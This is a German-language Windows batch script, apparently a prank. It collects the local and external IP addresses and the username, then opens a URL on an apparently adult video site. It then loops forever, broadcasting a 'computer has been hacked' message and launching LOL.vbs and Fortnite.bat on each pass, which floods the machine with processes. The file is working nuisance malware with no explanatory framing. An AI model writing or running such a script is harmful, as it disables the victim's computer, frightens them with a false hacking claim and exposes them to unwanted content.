@echo off

:PullIPv4Privat
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv4"') do set ip=%%A
echo Deine IP-Adresse ist: %ip%
:PullIPext
for /f "tokens=1* delims=: " %%A in ('nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"') do set extIP=%%B
echo Deine externe IP-Adresse ist: %extIP%
:cumputername
for /f "tokens=2*" %%i in ('net user %username% ^| findstr /B /C:"Vollständiger Name"') do set fullname=%%i
echo cumputername ist: %username%
start https://xtube.chat/watch.php?video=SJP1RF.mp4
:Spamm
msg * Computer Mit Username: %username% und IPv4 %ip% Wurde Gehackt
echo Computer Mit Username: %username% und IPv4:%ip% Wurde Gehackt
start LOL.vbs
start Fortnite.bat
goto Spamm
